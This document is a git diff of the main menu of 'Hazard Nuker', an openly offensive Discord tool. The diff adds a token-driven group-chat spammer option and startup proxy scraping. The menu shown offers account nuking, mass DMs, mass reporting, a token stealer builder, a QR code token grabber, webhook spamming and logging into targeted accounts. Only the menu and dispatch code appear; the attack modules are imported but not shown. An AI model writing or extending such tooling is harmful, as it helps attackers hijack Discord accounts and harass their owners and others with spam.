@@ -1,18 +1,19 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
-import requests, threading
+import requests, threading, os
 
 from time import sleep
 from colorama import Fore, Style, init
 
 # I know you can import the modules alot better but just got so many issues with importing * so just did this instead
-from util.plugins.common import clear, setTitle, getheaders, THIS_VERSION
+from util.plugins.common import clear, setTitle, getheaders, THIS_VERSION, proxy_scrape
 from util.plugins.update import search_for_updates
 import util.accountNuke
 import util.dmdeleter
 import util.info
 import util.login
+import util.groupchat_spammer
 import util.massreport
 import util.QR_Grabber
 import util.seizure
@@ -52,9 +53,9 @@ def main():
 {Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.BLACK} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.BLACK} Create Stealer.V2 
 {Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.BLACK} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.BLACK} QR Code grabber
 {Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.BLACK} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.BLACK} Mass Report
-{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.BLACK} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
-{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.RED} Exit
-{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.BLACK} Log into an account                         |
+{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.BLACK} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.BLACK} GroupChat Spammer
+{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
+{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.BLACK} Log into an account                         |{Fore.RESET}[{Fore.GREEN}18{Fore.RESET}]{Fore.RED} Exit
 {Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
     print(banner)
     choice = str(input(
@@ -346,7 +347,22 @@ def main():
             main()
 
 
-    elif choice == '16':
+    elif choice == "16":
+        token = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
+        r = requests.get(
+            'https://discord.com/api/v9/users/@me',
+            headers=getheaders(token))
+        if r.status_code == 200:
+            clear()
+            util.groupchat_spammer.GcSpammer(token)
+        else:
+            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
+            sleep(1)
+            main() 
+
+
+    elif choice == '17':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
@@ -402,9 +418,9 @@ def main():
                 sleep(4)
                 main()
             util.webhookspammer.WebhookSpammer(WebHook, Message, Timer)
-            
 
-    elif choice == '17':
+
+    elif choice == '18':
         setTitle("Exiting...")
         choice = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
@@ -421,4 +437,8 @@ def main():
 
 if __name__ == "__main__":
     search_for_updates()
+    with open(os.getenv("temp")+"\\proxies.txt", 'w'): pass
+    clear()
+    proxy_scrape()
+    sleep(1)
     main()
